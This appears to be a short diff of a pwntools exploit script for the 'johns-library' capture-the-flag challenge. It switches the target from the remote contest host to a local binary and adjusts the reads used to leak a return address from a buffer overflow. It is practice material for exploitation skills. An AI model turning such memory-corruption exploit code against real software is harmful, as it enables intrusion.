@@ -17,8 +17,8 @@ The overflow from the add isn't exploited until exiting the program
 """
 
 
-# r = process('./johns-library')
-r = remote('library.polictf.it', 80)
+r = process('./johns-library')
+# r = remote('library.polictf.it', 80)
 
 # Debugging help with gdb
 '''
@@ -37,8 +37,8 @@ r.sendline()
 log.info("Leaking buffer")
 r.sendline('r')
 r.sendline('1')
-r.recv()
-r.recv()
+# r.recv()
+# r.recv()
 r.recvuntil('read: ')
 
 ret = r.recv()[:4]
